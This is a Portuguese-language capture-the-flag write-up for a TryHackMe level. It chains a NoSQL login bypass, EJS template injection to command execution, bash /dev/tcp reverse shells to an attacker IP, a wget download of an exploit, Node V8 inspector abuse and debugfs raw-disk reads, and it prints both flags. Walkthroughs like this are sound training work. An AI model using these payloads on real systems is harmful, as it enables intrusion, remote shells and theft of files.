# TryHackMe — Hackers Holiday CTF
## Level 7 — Do Not Disturb

**Categoria:** Web Exploitation / NoSQL Injection / SSTI (RCE) / Privilege Escalation
**Dificuldade:** Difícil

---

### 🛎️ Concierge Briefing

> Sign's on the door. Room's active. You have access you were never given, and so does he.
> The anomalies stop being anomalies: a session goes warm on a sunbed, and a stranger sits down in it, a wallet signs a transaction its owner didn't authorise, a shell on the beach answers back. And it becomes clear that whoever's already inside has been moving for far longer than you have.
> The Byte Lotus poolside platform tracks every cabana, every sunbed, every warm session. Byte Lotus never forgets. Someone is already inside. Follow his footprints in, climb the way he climbed, and recover both flags.

**Exploit utilizado:** [BHBarlow/node-inspector-rce](https://github.com/BHBarlow/node-inspector-rce)

---

## 🎯 Objetivo

Este é o level mais denso da série: a plataforma **"Byte Lotus Poolside"** (gerenciamento de cabanas/sunbeds) esconde uma cadeia completa de comprometimento — de uma falha de autenticação até escalonamento de privilégios via inspetor de depuração do Node.js. O briefing deixa claro que **alguém já está lá dentro** havia mais tempo, e o objetivo é seguir exatamente os mesmos passos para recuperar **duas flags**: a de usuário (`user.txt`) e a de root (`root.txt`).

### 🖼️ A história por trás do ataque

![Tirinha "02 Drift" contextualizando o incidente](/Hacker%20Holiday%202026%20-%20THM/7º%20Level%20-%20Do%20Not%20Disturb/images/Story_of_CTF.png)

A tirinha da narrativa do evento (*"02 — Drift"*) resume o que está acontecendo nos bastidores: saldos de carteira cripto mudando sozinhos, sessões "esquentando" em sunbeds que ninguém ocupou, transações não autorizadas sendo assinadas — sinais de que um invasor já estava dentro da infraestrutura do resort havia bastante tempo, silenciosamente.

---

## 🔍 Passo 1 — Reconhecimento com Nmap

```bash
sudo nmap -A -sC -Pn -p- -T4 10.65.182.217
```

![Resultado do Nmap: portas 22 (SSH) e 80 (HTTP/Node.js)](/Hacker%20Holiday%202026%20-%20THM/7º%20Level%20-%20Do%20Not%20Disturb/images/Nmap_Scan.png)

Resultado:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
80/tcp open  http    Node.js (Express middleware)
|_http-title: Byte Lotus &mdash; Poolside
```

Confirmado: um serviço web em **Node.js/Express** na porta 80, chamado **"Byte Lotus — Poolside"**, além de SSH exposto na porta 22.

---

## 🔍 Passo 2 — Explorando a aplicação web

Acessando `http://10.65.182.217`:

![Página de login da plataforma Poolside](/Hacker%20Holiday%202026%20-%20THM/7º%20Level%20-%20Do%20Not%20Disturb/images/Login_Page.png)

A página apresenta um formulário de login com os campos **"Staff / Guest ID"** (com o placeholder `attendant`, uma dica direta de usuário) e **"Passphrase"**. O rodapé traz o slogan *"Byte Lotus never forgets · Stay Noticed™"* — outra pista de que o sistema registra (e talvez guarde) mais do que deveria.

### Enumerando diretórios com Gobuster

```bash
gobuster dir -u http://10.65.182.217/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 50 -x php,txt,js
```

![Gobuster encontrando os endpoints /staff e /logout](/Hacker%20Holiday%202026%20-%20THM/7º%20Level%20-%20Do%20Not%20Disturb/images/Gobuster_Scan.png)

```
logout   (Status: 302) [Size: 23] [--> /]
staff    (Status: 403) [Size: 1547]
```

O endpoint **`/staff`** existe, mas retorna **403 Forbidden** — indicando que é necessária uma sessão autenticada com o papel correto.

---

## 🔍 Passo 3 — Bypass de autenticação via NoSQL Injection

Como o backend é Node.js/Express, a hipótese é de um banco **NoSQL (MongoDB)** por trás da autenticação — um alvo clássico para **operadores de injeção NoSQL** (`$ne`, `$gt`, etc.) quando o corpo da requisição não é sanitizado corretamente.

```bash
curl -i -X POST http://10.67.152.198/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attendant","password":{"$ne":null}}'
```

![Bypass de autenticação via injeção NoSQL no campo password](/Hacker%20Holiday%202026%20-%20THM/7º%20Level%20-%20Do%20Not%20Disturb/images/NoSQLi_Bypass.png)

Resposta:

```
HTTP/1.1 200 OK
Set-Cookie: connect.sid=s%3AFXy-9HoAAFMO6jJWWJa3U5B36R1mr7jW.aKlt0EkFGx%2B1JccfXVdQhdMmt2hRegJU5GRgL3i1rTs; Path=/; HttpOnly

{"ok":true,"role":"staff"}
```

O operador `{"$ne": null}` no campo `password` faz com que o MongoDB interprete a condição como *"a senha é diferente de nula"* — que é sempre verdadeiro para qualquer senha armazenada — **contornando completamente a autenticação** e obtendo uma sessão com papel `staff`.

Usando o cookie retornado para acessar `/staff`:

```bash
curl -i http://10.67.152.198/staff \
  -H "Cookie: connect.sid=s%3AAnWps267zyI8O3exYhm8eSy1Lc5pjKYAQ.8eWPmKfunS2erfifWul2efB2Man4KOH7l3Ef3VYwRiY"
```

A resposta revela a página **"Cabana Desk"** — um console interno para a equipe (`staff`) personalizar mensagens de confirmação de reserva, usando um template **EJS**:

```html
<h1>Cabana Desk</h1>
<p class="sub">Signed in as <strong>attendant</strong>. Customise the guest booking-confirmation message below.</p>
<form method="post" action="/staff/preview">
  <label>Confirmation template <span class="muted">(EJS &mdash; use &lt;%= guest %&gt; to personalise)</span></label>
  <textarea name="template">Dear <%= guest %>, your Byte Lotus cabana is confirmed.</textarea>
  <button type="submit">Preview</button>
</form>
```

A própria interface já denuncia a tecnologia usada para renderizar o template: **EJS**, e a dica `<%= guest %>` sugere que o valor enviado no campo `template` é **avaliado diretamente como código EJS** — um forte indício de **Server-Side Template Injection (SSTI)**.

> 💡 De forma equivalente, o mesmo cookie de sessão também pôde ser capturado diretamente no navegador, através do **DevTools → Application → Cookies**, confirmando o valor de `connect.sid` após o login:
>
> ![Cookie de sessão (connect.sid) visível no DevTools do navegador](/Hacker%20Holiday%202026%20-%20THM/7º%20Level%20-%20Do%20Not%20Disturb/images/Bypass_DevTools.png)

---

## 🔍 Passo 4 — Explorando o SSTI para execução remota de comandos

Como o EJS renderiza `<%= %>` executando JavaScript no servidor, é possível abusar dessa sintaxe para rodar comandos arbitrários do sistema operacional através do módulo `child_process` do Node.js.

### Confirmando a RCE

```bash
curl -s -X POST http://10.67.171.184/staff/preview \
  -H "Cookie: connect.sid=s%3AqNW-levB_lLn59FLDk-N_EYL1a807x7J.fXfqjnPltJp7nqR%2FPjaPSKuuO6RauMxS2UFNsJcR90o" \
  -d 'template=<%= process.mainModule.require("child_process").execSync("ls /") %>'
```

![SSTI confirmado: execução de "ls /" no servidor via template EJS](/Hacker%20Holiday%202026%20-%20THM/7º%20Level%20-%20Do%20Not%20Disturb/images/Enum_Directory_via_CLI.png)

A resposta contém a listagem completa do diretório raiz do servidor (`bin`, `boot`, `etc`, `home`, `root`, `usr`, ...) — **execução remota de comandos confirmada**.

### Extraindo a primeira flag (usuário)

```bash
curl -s -X POST http://10.67.171.184/staff/preview \
  -H "Cookie: connect.sid=s%3AqNW-levB_lLn59FLDk-N_EYL1a807x7J.fXfqjnPltJp7nqR%2FPjaPSKuuO6RauMxS2UFNsJcR90o" \
  -d 'template=<%= process.mainModule.require("child_process").execSync("cat /home/poolside/user.txt") %>'
```

![Leitura de /home/poolside/user.txt via SSTI, revelando a primeira flag](/Hacker%20Holiday%202026%20-%20THM/7º%20Level%20-%20Do%20Not%20Disturb/images/Flag_User.txt.png)

Trecho relevante da resposta HTML:

```html
<pre>THM{w4rm_s3ss10n_h1j4ck3d}</pre>
```

## 🚩 Flag de usuário

```
THM{w4rm_s3ss10n_h1j4ck3d}
```

---

## 🔍 Passo 5 — De SSTI para shell reversa completa

Com RCE confirmada, o próximo passo é transformar essa execução pontual em uma **shell interativa**. Um listener foi preparado localmente:

```bash
nc -lnvp 4444
```

E o mesmo endpoint `/staff/preview` foi usado para disparar uma reverse shell:

```bash
curl -s -X POST http://10.67.171.184/staff/preview \
  -H "Cookie: connect.sid=s%3AqNW-levB_lLn59FLDk-N_EYL1a807x7J.fXfqjnPltJp7nqR%2FPjaPSKuuO6RauMxS2UFNsJcR90o" \
  -d 'template=<%= process.mainModule.require("child_process").exec("bash -c \"bash -i >& /dev/tcp/192.168.157.47/4444 0>&1\"") %>'
```

![Shell reversa recebida no listener, a partir do payload SSTI enviado pelo navegador/curl](/Hacker%20Holiday%202026%20-%20THM/7º%20Level%20-%20Do%20Not%20Disturb/images/Reverse_Shell_Spawn.png)

```
listening on [any] 4444 ...
connect to [192.168.157.47] from (UNKNOWN) [10.67.171.184] 48394
poolside@tryhackme-2404:/opt/poolside$
```

Shell obtida como o usuário de baixo privilégio **`poolside`**.

---

## 🔍 Passo 6 — Enumeração pós-exploração: o inspetor V8 do Node.js

Já dentro do sistema como `poolside`, a enumeração de processos revela algo interessante:

```bash
ps aux | grep inspect
```

```
pipelin+   600  0.0  2.5 1054104 51292 ?  Ssl  22:20  0:00 /usr/bin/node --inspect=127.0.0.1:9229 processor.js
```

Um processo Node.js rodando como o usuário **`pipelinesvc`**, com o **inspetor de depuração do V8 (`--inspect`)** exposto em `127.0.0.1:9229`. Esse protocolo de depuração, quando acessível, **permite executar JavaScript arbitrário dentro do processo Node** — um vetor de escalonamento de privilégios muito conhecido (o mesmo endereçado pelo exploit [`node-inspector-rce`](https://github.com/BHBarlow/node-inspector-rce)).

### Baixando o exploit para o alvo

Um servidor HTTP local foi iniciado na máquina atacante para servir o script do exploit, que foi baixado via `wget` diretamente na shell obtida:

```bash
cd /tmp && mkdir x && cd x
wget http://192.168.157.47:8000/node_inspector_lpe.py
```

![Download do script de exploração (node_inspector_lpe.py) via wget na shell obtida](/Hacker%20Holiday%202026%20-%20THM/7º%20Level%20-%20Do%20Not%20Disturb/images/Export_Node.js_Exploit.png)

```
2026-08-04 23:39:45 (108 KB/s) - 'node_inspector_lpe.py' saved [12746/12746]
```

---

## 🔍 Passo 7 — Explorando o Node Inspector para virar `pipelinesvc`

Com o script no alvo, ele foi executado localmente, conectando-se ao inspetor V8 exposto em `127.0.0.1:9229`:

```bash
python3 node_inspector_lpe.py --payload revshell --lhost 192.168.157.47 --lport 6767
```

![Execução do exploit node_inspector_lpe.py: confirmação via "id" e disparo de uma segunda reverse shell como pipelinesvc](/Hacker%20Holiday%202026%20-%20THM/7º%20Level%20-%20Do%20Not%20Disturb/images/Explot_Run.png)

```
Local Privilege Escalation via V8 Inspector

[*] Target: processor.js
[*] WebSocket URL: ws://127.0.0.1:9229/f13b8fea-d6bf-47b8-820a-3a2386502c7a
[+] Connected!
[*] Payload: Run `id` to confirm root execution
[*] Evaluating: require('child_process').execSync('id').toString()

[+] Result:
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

O exploit confirma execução de código dentro do processo `processor.js`, assumindo a identidade **`pipelinesvc`** (uid 995) — que, notavelmente, pertence também ao grupo **`disk`** (gid 6).

Repetindo o exploit com um payload de reverse shell, agora escutando na porta `6767`:

```
[*] Payload: Bash reverse shell back to attacker
[*] Evaluating: require('child_process').exec('bash -c "bash -i >& /dev/tcp/192.168.157.47/6767 0>&1"').toString()
```

E capturando a shell:

```bash
nc -lnvp 6767
```

```
connect to [192.168.157.47] from (UNKNOWN) [10.67.171.184] 56966
pipelinesvc@tryhackme-2404:/opt/pipelinesvc/telemetry$
```

Nova shell obtida, agora como **`pipelinesvc`**.

---

## 🔍 Passo 8 — Escalando para root: acesso bruto ao disco via `debugfs`

Verificando os grupos do novo usuário:

```bash
groups
```

```
pipelinesvc disk
```

O usuário `pipelinesvc` pertence ao grupo **`disk`**, que normalmente concede acesso direto aos dispositivos de bloco brutos do sistema (`/dev/nvme*`), **contornando as permissões do sistema de arquivos**.

```bash
lsblk
```

```
nvme1n1  259:0    0   1G  0 disk
nvme0n1  259:1    0  20G  0 disk
└─nvme0n1p1 259:2  0  20G  0 part /
```

A primeira tentativa foi montar a partição diretamente:

```bash
mkdir /tmp/rootfs
mount /dev/nvme0n1p1 /tmp/rootfs
```

```
mount: /tmp/rootfs: must be superuser to use mount.
```

Como esperado, `mount` exige privilégio de root — pertencer ao grupo `disk` concede **leitura no dispositivo**, mas não permissão para montá-lo. A alternativa é usar uma ferramenta que **leia a estrutura do sistema de arquivos ext diretamente do dispositivo bruto**, sem precisar montá-lo: o **`debugfs`**.

```bash
which debugfs
debugfs /dev/nvme0n1p1
```

Dentro do `debugfs`, é possível navegar pela árvore do sistema de arquivos como se fosse um shell próprio:

```
debugfs:  ls /
... boot dev etc home lib ... root ... usr var ...
debugfs:  cd /root
debugfs:  ls
.  ..  .profile  .bashrc  .ssh  snap  .local  .bash_history  .viminfo  .npm  root.txt
debugfs:  cat root.txt
```

![Leitura do root.txt via debugfs, sem montar o disco nem ter privilégio de root](/Hacker%20Holiday%202026%20-%20THM/7º%20Level%20-%20Do%20Not%20Disturb/images/Root_Flag.txt.png)

```
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```

## 🚩 Flag de root

```
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```

---

## 📝 Resumo da cadeia de investigação

1. **Nmap** → identifica o serviço web em Node.js/Express (porta 80) e SSH (porta 22).
2. **Reconhecimento web + Gobuster** → encontra a página de login "Poolside" e o endpoint protegido `/staff`.
3. **NoSQL Injection** (`{"password": {"$ne": null}}`) → contorna a autenticação e obtém uma sessão com papel `staff`.
4. **Acesso ao `/staff`** → revela o console "Cabana Desk", que renderiza templates **EJS** enviados pelo usuário.
5. **SSTI no template EJS** (`<%= process.mainModule.require("child_process").execSync(...) %>`) → execução remota de comandos confirmada.
6. **Leitura de `/home/poolside/user.txt`** via SSTI → primeira flag.
7. **Reverse shell via SSTI** → shell interativa como o usuário `poolside`.
8. **Enumeração pós-exploração** → descoberta de um processo Node.js rodando com o **V8 Inspector** exposto (`--inspect=127.0.0.1:9229`), pertencente ao usuário `pipelinesvc`.
9. **Exploit [`node-inspector-rce`](https://github.com/BHBarlow/node-inspector-rce)** → conecta ao inspetor via WebSocket e executa código arbitrário como `pipelinesvc`.
10. **Segunda reverse shell** → shell interativa como `pipelinesvc`, membro do grupo `disk`.
11. **`debugfs` no dispositivo bruto** (`/dev/nvme0n1p1`) → leitura direta do sistema de arquivos sem montagem e sem privilégio de root.
12. **Leitura de `/root/root.txt`** → segunda flag.

---